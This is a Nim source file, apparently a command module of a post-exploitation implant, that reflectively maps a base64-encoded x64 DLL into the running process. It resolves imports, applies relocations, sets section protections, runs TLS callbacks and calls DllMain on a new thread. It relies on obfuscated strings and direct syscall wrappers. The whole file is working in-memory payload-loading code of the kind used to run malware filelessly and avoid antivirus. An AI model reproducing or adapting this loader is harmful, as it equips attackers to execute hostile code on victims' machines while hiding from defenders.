import std/base64
from std/strutils import toHex
import ../../utils/global
import ../../utils/msg
import ../../utils/winapi/syscall
import ../../utils/winapi/handlers
import ../../utils/winapi/utils

# Raw GetProcAddress so imports by ordinal keep working
# (the handlers wrapper only accepts string names).
proc rawGetProcAddress(hMod, api: pointer): pointer {.stdcall, importc: "GetProcAddress", dynlib: "kernel32".}

const
  dosMagic = 0x5A4D'u16
  peSignature = 0x00004550'u32
  optMagicPe32Plus = 0x20B'u16
  machineAmd64 = 0x8664'u16
  dirImport = 1
  dirException = 3
  dirReloc = 5
  dirTls = 9
  imageRelocHighLow = 3'u16
  imageRelocDir64 = 10'u16
  imageOrdinalFlag64 = 0x8000000000000000'u64
  dllProcessAttach = 1'u32
  memCommitReserve = MEM_COMMIT or MEM_RESERVE
  scnMemDiscardable = 0x02000000'u32
  scnMemExecute = 0x20000000'u32
  scnMemWrite = 0x80000000'u32

type
  ImageDosHeader {.packed.} = object
    eMagic: uint16
    eCblp: uint16
    eCp: uint16
    eCrlc: uint16
    eCparHdr: uint16
    eMinalloc: uint16
    eMaxalloc: uint16
    eSs: uint16
    eSp: uint16
    eCsum: uint16
    eIp: uint16
    eCs: uint16
    eLfarlc: uint16
    eOvno: uint16
    eRes: array[4, uint16]
    eOemid: uint16
    eOeminfo: uint16
    eRes2: array[10, uint16]
    eLfanew: int32

  ImageFileHeader {.packed.} = object
    machine: uint16
    numberOfSections: uint16
    timeDateStamp: uint32
    pointerToSymbolTable: uint32
    numberOfSymbols: uint32
    sizeOfOptionalHeader: uint16
    characteristics: uint16

  ImageDataDirectory {.packed.} = object
    virtualAddress: uint32
    size: uint32

  ImageOptionalHeader64 {.packed.} = object
    magic: uint16
    majorLinkerVersion: uint8
    minorLinkerVersion: uint8
    sizeOfCode: uint32
    sizeOfInitializedData: uint32
    sizeOfUninitializedData: uint32
    addressOfEntryPoint: uint32
    baseOfCode: uint32
    imageBase: uint64
    sectionAlignment: uint32
    fileAlignment: uint32
    majorOperatingSystemVersion: uint16
    minorOperatingSystemVersion: uint16
    majorImageVersion: uint16
    minorImageVersion: uint16
    majorSubsystemVersion: uint16
    minorSubsystemVersion: uint16
    win32VersionValue: uint32
    sizeOfImage: uint32
    sizeOfHeaders: uint32
    checkSum: uint32
    subsystem: uint16
    dllCharacteristics: uint16
    sizeOfStackReserve: uint64
    sizeOfStackCommit: uint64
    sizeOfHeapReserve: uint64
    sizeOfHeapCommit: uint64
    loaderFlags: uint32
    numberOfRvaAndSizes: uint32
    dataDirectory: array[16, ImageDataDirectory]

  ImageNtHeaders64 {.packed.} = object
    signature: uint32
    fileHeader: ImageFileHeader
    optionalHeader: ImageOptionalHeader64

  ImageSectionHeader {.packed.} = object
    name: array[8, byte]
    virtualSize: uint32
    virtualAddress: uint32
    sizeOfRawData: uint32
    pointerToRawData: uint32
    pointerToRelocations: uint32
    pointerToLinenumbers: uint32
    numberOfRelocations: uint16
    numberOfLinenumbers: uint16
    characteristics: uint32

  ImageImportDescriptor {.packed.} = object
    originalFirstThunk: uint32
    timeDateStamp: uint32
    forwarderChain: uint32
    nameRva: uint32
    firstThunk: uint32

  ImageBaseRelocation {.packed.} = object
    virtualAddress: uint32
    sizeOfBlock: uint32

  ImageTlsDirectory64 {.packed.} = object
    startAddressOfRawData: uint64
    endAddressOfRawData: uint64
    addressOfIndex: uint64
    addressOfCallBacks: uint64
    sizeOfZeroFill: uint32
    characteristics: uint32

  ImageRuntimeFunctionEntry {.packed.} = object
    beginAddress: uint32
    endAddress: uint32
    unwindInfo: uint32

  TdllEntry = proc(hinst: pointer; reason: uint32; reserved: pointer): int32 {.stdcall.}
  TTlsCallback = proc(dllHandle: pointer; reason: uint32; reserved: pointer) {.stdcall.}
  TTlsAlloc = proc(): uint32 {.stdcall.}
  TRtlAddFunctionTable = proc(fnTable: ptr ImageRuntimeFunctionEntry; entryCount: uint32; baseAddress: uint64): uint8 {.stdcall.}
  TRtlRemoveFunctionTable = proc(fnTable: ptr ImageRuntimeFunctionEntry; entryCount: uint32; baseAddress: uint64) {.stdcall.}

  DllMainCtx = object
    base: pointer
    entry: pointer

proc decodeInput(input: string): seq[byte] =
  # Decodes a base 64 input string into raw bytes
  try:
    if input.len == 0: return @[]
    let raw = decode(input)
    result = newSeq[byte](raw.len)
    if raw.len > 0: copyMem(addr result[0], unsafeAddr raw[0], raw.len)
  except ValueError:
    return @[]

proc rvaToPtr(base: pointer; imageSize: uint32; rva, span: uint64): pointer =
  # Converts a relative virtual address into a pointer inside the image
  if rva == 0 or rva + span > uint64(imageSize): nil
  else: cast[pointer](cast[uint64](base) + rva)

proc inImage(base: pointer; imageSize: uint32; va: uint64): bool =
  # Checks that a virtual address falls inside the mapped image
  va >= cast[uint64](base) and va + 8 <= cast[uint64](base) + uint64(imageSize)

proc dataDir(opt: ptr ImageOptionalHeader64; idx: int): ImageDataDirectory =
  # Reads one data directory from the optional header
  if idx < int(opt.numberOfRvaAndSizes) and idx < 16:
    opt.dataDirectory[idx]
  else:
    ImageDataDirectory(virtualAddress: 0'u32, size: 0'u32)

proc protectRegion(base: pointer; size: uint32; prot: culong): bool =
  # Changes the protection of a memory region
  var pageBase = base
  var region = csize_t(size)
  var old: culong = 0
  protectVirtualMemory(currentProcess, addr pageBase, addr region, prot, addr old) == 0

proc releaseImage(base: pointer; imageSize: uint32; exDir: ImageDataDirectory; registered: bool) =
  # Unregisters the exception table and frees the mapped image
  if registered:
    let ntdll = getModuleHandleA(obf("ntdll"))
    if ntdll != nil:
      let removeFn = cast[TRtlRemoveFunctionTable](getProcAddress(ntdll, obf("RtlRemoveFunctionTable")))
      if removeFn != nil:
        let fnTable = cast[ptr ImageRuntimeFunctionEntry](
          rvaToPtr(base, imageSize, uint64(exDir.virtualAddress), uint64(exDir.size)))
        if fnTable != nil:
          removeFn(fnTable, exDir.size div uint32(sizeof(ImageRuntimeFunctionEntry)), cast[uint64](base))
  if base != nil:
    var freeBase = base
    discard freeVirtualMemory(currentProcess, addr freeBase, MEM_RELEASE)

proc applyRelocations(base: pointer; imageSize: uint32; relocDir: ImageDataDirectory; delta: int64): bool =
  # Applies base relocations when the image is not at its preferred base
  var remaining = uint64(relocDir.size)
  var blk = cast[ptr ImageBaseRelocation](rvaToPtr(base, imageSize, relocDir.virtualAddress, remaining))
  if blk == nil: return false
  while remaining >= uint64(sizeof(ImageBaseRelocation)):
    let blkSize = uint64(blk.sizeOfBlock)
    if blkSize < uint64(sizeof(ImageBaseRelocation)) or blkSize > remaining or blkSize mod 2 != 0:
      return false
    let count = int((blkSize - uint64(sizeof(ImageBaseRelocation))) div 2)
    let entries = cast[ptr UncheckedArray[uint16]](cast[pointer](cast[uint64](blk) + uint64(sizeof(ImageBaseRelocation))))
    for eIdx in 0 ..< count:
      let entry = entries[eIdx]
      let typ = entry shr 12
      let off = uint64(entry and 0x0FFF)
      case typ
      of 0:
        discard
      of imageRelocHighLow:
        let tgt = rvaToPtr(base, imageSize, uint64(blk.virtualAddress) + off, 4)
        if tgt == nil: return false
        let p = cast[ptr uint32](tgt)
        p[] = uint32(uint64(p[]) + uint64(delta and 0xFFFFFFFF))
      of imageRelocDir64:
        let tgt = rvaToPtr(base, imageSize, uint64(blk.virtualAddress) + off, 8)
        if tgt == nil: return false
        let p = cast[ptr uint64](tgt)
        p[] = uint64(int64(p[]) + delta)
      else:
        return false
    remaining -= blkSize
    blk = cast[ptr ImageBaseRelocation](cast[pointer](cast[uint64](blk) + blkSize))
  true

proc buildImportTable(base: pointer; imageSize: uint32; impDir: ImageDataDirectory): string =
  # Builds the import table and returns the failing module name
  # Returns an empty string on success or the failing module name.
  result = ""
  var i = 0
  while true:
    let desc = cast[ptr ImageImportDescriptor](
      rvaToPtr(base, imageSize, uint64(impDir.virtualAddress) + uint64(i) * uint64(sizeof(ImageImportDescriptor)),
               uint64(sizeof(ImageImportDescriptor))))
    if desc == nil: return obf("invalid import descriptor")
    if desc.nameRva == 0 and desc.firstThunk == 0 and desc.originalFirstThunk == 0: break
    let modNamePtr = rvaToPtr(base, imageSize, uint64(desc.nameRva), 64)
    if modNamePtr == nil: return obf("invalid import module name")
    let modName = $cast[cstring](modNamePtr)
    if modName.len == 0: return obf("invalid import module name")
    var hMod = getModuleHandleA(modName)
    if hMod == nil:
      hMod = loadLibraryA(modName)
    if hMod == nil: return modName
    let intRva = if desc.originalFirstThunk != 0: desc.originalFirstThunk else: desc.firstThunk
    var idx = 0
    while true:
      let thunkPtr = cast[ptr uint64](rvaToPtr(base, imageSize, uint64(intRva) + uint64(idx) * 8, 8))
      if thunkPtr == nil: return modName
      let thunk = thunkPtr[]
      if thunk == 0: break
      let procAddr: pointer =
        if (thunk and imageOrdinalFlag64) != 0:
          rawGetProcAddress(hMod, cast[pointer](thunk and 0xFFFF))
        else:
          let namePtr = rvaToPtr(base, imageSize, thunk and 0xFFFFFFFF'u64, 258)
          if namePtr == nil: nil
          else: rawGetProcAddress(hMod, cast[pointer](cast[uint64](namePtr) + 2))
      if procAddr == nil: return modName
      let iatPtr = cast[ptr uint64](
        rvaToPtr(base, imageSize, uint64(desc.firstThunk) + uint64(idx) * 8, 8))
      if iatPtr == nil: return modName
      iatPtr[] = cast[uint64](procAddr)
      inc idx
    inc i

proc finalizeSections(base: pointer; opt: ptr ImageOptionalHeader64;
                      sec0: ptr ImageSectionHeader; secCount: int): bool =
  # Sets the memory protection of each section
  # Headers become read-only first (relocations/imports are already applied).
  if not protectRegion(base, opt.sizeOfHeaders, PAGE_READONLY):
    return false
  for i in 0 ..< secCount:
    let s = cast[ptr ImageSectionHeader](cast[pointer](cast[uint64](sec0) + uint64(i) * uint64(sizeof(ImageSectionHeader))))
    if s.virtualAddress == 0 and s.virtualSize == 0: continue
    # NOTE: protect VirtualSize (page rounded by the kernel), never SizeOfRawData.
    let span = if s.virtualSize != 0: s.virtualSize else: s.sizeOfRawData
    if span == 0: continue
    if (s.characteristics and scnMemDiscardable) != 0: continue
    let prot: culong =
      if (s.characteristics and scnMemExecute) != 0:
        if (s.characteristics and scnMemWrite) != 0: PAGE_EXECUTE_READWRITE
        else: PAGE_EXECUTE_READ
      elif (s.characteristics and scnMemWrite) != 0: PAGE_READWRITE
      else: PAGE_READONLY
    if not protectRegion(cast[pointer](cast[uint64](base) + uint64(s.virtualAddress)), span, prot):
      return false
  true

proc registerExceptionTable(base: pointer; imageSize: uint32; exDir: ImageDataDirectory): bool =
  # Registers the exception table for the mapped image
  result = false
  if exDir.size == 0 or exDir.size mod uint32(sizeof(ImageRuntimeFunctionEntry)) != 0: return
  let ntdll = getModuleHandleA(obf("ntdll"))
  if ntdll == nil: return
  let addFn = cast[TRtlAddFunctionTable](getProcAddress(ntdll, obf("RtlAddFunctionTable")))
  if addFn == nil: return
  let fnTable = cast[ptr ImageRuntimeFunctionEntry](
    rvaToPtr(base, imageSize, uint64(exDir.virtualAddress), uint64(exDir.size)))
  if fnTable == nil: return
  result = addFn(fnTable, exDir.size div uint32(sizeof(ImageRuntimeFunctionEntry)), cast[uint64](base)) != 0

proc processTls(base: pointer; imageSize: uint32; tlsDir: ImageDataDirectory): bool =
  # Initializes the tls index and runs tls callbacks
  result = true
  if tlsDir.size == 0: return
  let tls = cast[ptr ImageTlsDirectory64](
    rvaToPtr(base, imageSize, uint64(tlsDir.virtualAddress), uint64(sizeof(ImageTlsDirectory64))))
  if tls == nil: return false
  if inImage(base, imageSize, tls.addressOfIndex):
    let tlsAllocFn = cast[TTlsAlloc](load(obf("TlsAlloc")))
    if tlsAllocFn == nil: return false
    let tlsIdx = tlsAllocFn()
    if tlsIdx == 0xFFFFFFFF'u32: return false
    cast[ptr uint32](cast[pointer](tls.addressOfIndex))[] = tlsIdx
  if tls.addressOfCallBacks != 0:
    var cbPtr = tls.addressOfCallBacks
    while inImage(base, imageSize, cbPtr):
      let fnAddr = cast[ptr uint64](cast[pointer](cbPtr))[]
      if fnAddr == 0: break
      if not inImage(base, imageSize, fnAddr):
        return false
      let cb = cast[TTlsCallback](cast[pointer](fnAddr))
      cb(base, dllProcessAttach, nil)
      cbPtr += 8

proc dllMainThread(param: pointer): int32 {.stdcall.} =
  # Thread entry that calls the dll entry point
  let ctx = cast[ptr DllMainCtx](param)
  let fn = cast[TdllEntry](ctx.entry)
  if fn(ctx.base, dllProcessAttach, nil) != 0: 1 else: 0

proc run_load_dll*(input, params: string; buf: var openArray[char]): int =
  # Main function that maps a dll into the current process
  let payload = decodeInput(input)
  if payload.len == 0:
    return writeErr(obf("empty or invalid input"), buf)
  if payload.len < sizeof(ImageDosHeader):
    return writeErr(obf("invalid PE: buffer too small"), buf)

  let dos = cast[ptr ImageDosHeader](unsafeAddr payload[0])
  if dos.eMagic != dosMagic:
    return writeErr(obf("invalid PE: missing MZ signature"), buf)
  if dos.eLfanew <= 0 or uint64(dos.eLfanew) + uint64(sizeof(ImageNtHeaders64)) > uint64(payload.len):
    return writeErr(obf("invalid PE: bad e_lfanew"), buf)

  let rawBase = cast[uint64](unsafeAddr payload[0])
  let nt = cast[ptr ImageNtHeaders64](cast[pointer](rawBase + uint64(dos.eLfanew)))
  if nt.signature != peSignature:
    return writeErr(obf("invalid PE: missing PE signature"), buf)
  if nt.fileHeader.machine != machineAmd64 or nt.optionalHeader.magic != optMagicPe32Plus:
    return writeErr(obf("unsupported PE: x64 PE32+ only"), buf)
  if nt.fileHeader.sizeOfOptionalHeader < uint16(sizeof(ImageOptionalHeader64)):
    return writeErr(obf("invalid PE: optional header too small"), buf)

  let opt = addr nt.optionalHeader
  let imageSize = opt.sizeOfImage
  let sizeOfHeaders = opt.sizeOfHeaders
  if imageSize == 0 or sizeOfHeaders == 0 or sizeOfHeaders > imageSize:
    return writeErr(obf("invalid PE: bad image/header size"), buf)
  if uint64(sizeOfHeaders) > uint64(payload.len):
    return writeErr(obf("invalid PE: headers out of bounds"), buf)

  let optEnd = uint64(dos.eLfanew) + uint64(sizeof(peSignature)) + uint64(sizeof(ImageFileHeader)) +
               uint64(nt.fileHeader.sizeOfOptionalHeader)
  let secCount = int(nt.fileHeader.numberOfSections)
  if optEnd + uint64(secCount) * uint64(sizeof(ImageSectionHeader)) > uint64(payload.len):
    return writeErr(obf("invalid PE: section table out of bounds"), buf)
  let sec0 = cast[ptr ImageSectionHeader](cast[pointer](rawBase + optEnd))

  # Every section must fit inside the raw buffer and the mapped image.
  for i in 0 ..< secCount:
    let s = cast[ptr ImageSectionHeader](cast[pointer](cast[uint64](sec0) + uint64(i) * uint64(sizeof(ImageSectionHeader))))
    if s.sizeOfRawData > 0 and uint64(s.pointerToRawData) + uint64(s.sizeOfRawData) > uint64(payload.len):
      return writeErr(obf("invalid PE: section data out of bounds"), buf)
    let span = max(s.virtualSize, s.sizeOfRawData)
    if uint64(s.virtualAddress) + uint64(span) > uint64(imageSize):
      return writeErr(obf("invalid PE: section exceeds image size"), buf)

  # Reserve RW memory for the whole image.
  var base = virtualAlloc(nil, csize_t(imageSize), memCommitReserve, PAGE_READWRITE)
  if base == nil:
    return writeErr(obf("image allocation failed"), buf)

  var registered = false
  let exDir = dataDir(opt, dirException)
  let relocDir = dataDir(opt, dirReloc)
  let impDir = dataDir(opt, dirImport)
  let tlsDir = dataDir(opt, dirTls)

  # Copy headers + sections into the mapped image.
  copyMem(base, unsafeAddr payload[0], int(sizeOfHeaders))
  for i in 0 ..< secCount:
    let s = cast[ptr ImageSectionHeader](cast[pointer](cast[uint64](sec0) + uint64(i) * uint64(sizeof(ImageSectionHeader))))
    if s.sizeOfRawData == 0: continue
    copyMem(cast[pointer](cast[uint64](base) + uint64(s.virtualAddress)),
            cast[pointer](rawBase + uint64(s.pointerToRawData)), int(s.sizeOfRawData))

  # Base relocations.
  let delta = cast[int64](base) - cast[int64](opt.imageBase)
  if delta != 0:
    if relocDir.size == 0:
      releaseImage(base, imageSize, exDir, registered)
      return writeErr(obf("PE has no relocation data (stripped)"), buf)
    if not applyRelocations(base, imageSize, relocDir, delta):
      releaseImage(base, imageSize, exDir, registered)
      return writeErr(obf("failed to apply base relocations"), buf)

  # Import table (IAT).
  if impDir.size > 0:
    let failedMod = buildImportTable(base, imageSize, impDir)
    if failedMod.len > 0:
      releaseImage(base, imageSize, exDir, registered)
      return writeErr(obf("failed to resolve imports from: ") & failedMod, buf)

  # Per-section memory protections.
  if not finalizeSections(base, opt, sec0, secCount):
    releaseImage(base, imageSize, exDir, registered)
    return writeErr(obf("failed to set section protections"), buf)

  # Exception table (x64 unwind info).
  registered = registerExceptionTable(base, imageSize, exDir)

  # TLS directory (index + callbacks).
  if not processTls(base, imageSize, tlsDir):
    releaseImage(base, imageSize, exDir, registered)
    return writeErr(obf("failed to initialize TLS"), buf)

  # DllMain(base, DLL_PROCESS_ATTACH, NULL) on a fresh thread.
  let entryRva = opt.addressOfEntryPoint
  var hadEntry = false
  if entryRva != 0:
    let entryPtr = rvaToPtr(base, imageSize, uint64(entryRva), 1)
    if entryPtr == nil:
      releaseImage(base, imageSize, exDir, registered)
      return writeErr(obf("invalid entry point"), buf)
    hadEntry = true
    var ctx = DllMainCtx(base: base, entry: entryPtr)
    inc bgWorkers
    let hThread = createThreadEx(currentProcess, cast[pointer](dllMainThread), addr ctx)
    if hThread == nil:
      dec bgWorkers
      releaseImage(base, imageSize, exDir, registered)
      return writeErr(obf("failed to run DllMain"), buf)
    discard waitForObject(hThread)
    var code: culong = 0
    discard getExitCodeThread(hThread, addr code)
    discard ntCloseHandle(hThread)
    dec bgWorkers
    if code == 0:
      releaseImage(base, imageSize, exDir, registered)
      return writeErr(obf("DllMain returned FALSE"), buf)

  let addrHex = toHex(cast[uint64](base), 12)
  if hadEntry:
    writeMsg(obf("DLL loaded at 0x") & addrHex, buf)
  else:
    writeMsg(obf("DLL loaded at 0x") & addrHex & obf(" (no entry point)"), buf)